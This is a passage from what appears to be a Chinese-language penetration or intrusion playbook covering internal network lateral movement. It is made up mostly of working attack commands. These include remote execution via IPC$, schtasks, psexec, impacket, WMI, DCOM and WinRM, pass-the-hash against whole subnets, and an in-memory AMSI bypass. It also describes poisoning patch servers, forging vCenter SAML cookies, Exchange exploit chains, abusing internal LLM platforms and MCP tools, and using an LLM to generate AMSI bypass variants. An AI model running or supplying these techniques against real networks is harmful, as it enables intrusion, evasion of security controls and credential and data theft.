## 七、横向移动矩阵

### 7.1 内网脆弱面（横向第一波）
```
# 顺序: 弱口令爆破 → 未授权访问 → 中间件RCE → MS17-010 → 密码撞库
# 弱口令: SSH/RDP/MSSQL/MySQL/Redis/Oracle/VNC/SMB/PostgreSQL
# 未授权: Redis / MongoDB / Elasticsearch / Memcached / ZooKeeper / Kafka / Hadoop YARN
# 中间件RCE: WebLogic(T3/IIOP) / JBoss / Tomcat部署 / Jenkins / ActiveMQ
# 批量自动化: fscan -nobr -nopoc 快速摸底, 再对结果定点利用
# 撞库: 用已获取的密码库批量碰撞所有资产(同口令复用率极高)
```

### 7.2 Windows远程执行技术（横向核心）
```
# IPC$ 建立连接
net use \\10.10.10.10\ipc$ "password" /user:domain\user
# 计划任务执行(老系统)
copy mu.exe \\10.10.10.10\C$ ; at \\10.10.10.10 15:15 C:\mu.exe
# schtasks(新系统)
schtasks /create /s 10.10.10.10 /tn test /sc onstart /tr c:\mu.exe /ru system /f
schtasks /run /s 10.10.10.10 /i /tn test
# PSEXEC(释放psexesvc服务,特征明显)
psexec \\10.10.10.10 -accepteula -u user -p pass cmd.exe
# impacket-psexec / smbexec (Python版,服务名可自定义混淆)
python3 psexec.py domain/user:pass@10.10.10.10
python3 smbexec.py domain/user:pass@10.10.10.10 -service-name 5A1n6
# WMI(无回显,配合IPC写文件读结果)
wmic /node:10.10.10.10 /user:admin /password:pass process call create "cmd.exe /c ipconfig > ip.txt"
wmiexec.py domain/user:pass@10.10.10.10
# DCOM(免上传文件)
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null," /c calc.exe","")
# WinRM(5985/5986,走HTTP)
evil-winrm -i 10.10.10.10 -u user -p pass
# 哈希传递PTH(拿到NTLM后无需明文)
crackmapexec smb 10.10.10.0/24 -u admin -H <ntlm_hash> --exec-method smbexec -x whoami
psexec.py -hashes :<ntlm_hash> domain/admin@10.10.10.10
```

### 7.3 Bypass AMSI
```
# 场景: PowerShell被AMSI拦截 → 横向脚本无法执行
# 1) 降级PS2.0(老系统)
powershell -version 2 -nop -c "IEX (...)"
# 2) 内存Patch AmsiScanBuffer(常见bypass脚本)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 3) 注册表禁用(高权限)
Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\Script\Settings -Name AmsiEnable -Value 0
# 4) 反射加载绕过(流量混淆+内存Patch), 工具: AMSI.fail在线生成变体
# AI辅助: 让LLM生成多种AMSI bypass变体用于AV/EDR测试(见11.3)
```

### 7.4 利用运维通道（高价值横向）
```
# 补丁服务器/软件分发: 投递恶意更新包或替换安装源
# EDR主控端: 若攻陷EDR管理端 → 全内网定向下发执行(隐蔽且高权限)
# 堡垒机: 堡垒机失守 = 全内网运维通道沦陷(需先拿堡垒机密码库)
# 跳板机/运维终端: 常保存大量运维账号与免密通道
# 监控平台(Zabbix/Prometheus/Grafana): 命令执行/配置注入
# 虚拟化平台(vCenter/ESXi/Proxmox/K8s): 见7.5
# 注意: 上述路径动静极大,先评估攻击噪音再决策
```

### 7.5 虚拟化/监控/邮件平台后渗透
```
# vCenter(拿到root后):
# 1) 从 data.mdb 提取IdP证书伪造SAML管理员cookie
#    (Linux: /storage/db/vmware-vmdir/data.mdb ; Win: C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb)
#    vcenter_ExtraCertFromMdb.py → vcenter_GenerateLoginCookie.py
# 2) 通过快照/虚拟机内存取证dump凭证 → PTH
# 3) CVE-2021-21972/21985等未授权RCE
# Zabbix: 弱口令 → 监控项命令执行(Server权限)
# Exchange: ProxyLogon(2021-26855)/ProxyShell链/Exchange2domain/NtlmRelayToEWS(横向至域管)
#   → 可读邮箱、重置域用户密码、滥用Exchange写ACL
```

### 7.6 AI大模型平台横向（新战场）
```
# 内网AI平台往往集中部署 GPU 算力 + 敏感训练/推理数据,攻击价值极高:
# 1) 未授权LLM服务(Ollama/vLLM/LM Studio) → 直接调用推理/拉模型(见12.1)
# 2) 向量数据库未授权 → 全量导出RAG知识库(内部文档/源码/凭证)(见12.2)
# 3) AI平台后台弱口令(Dify/FastGPT/Langflow/MaxKB) → 管理所有知识库与模型
# 4) MCP/Agent服务暴露 → 工具调用滥用(文件/数据库/内网HTTP)(见12.3)
# 5) 模型文件本身: 从存储/备份拉取权重与微调数据
```

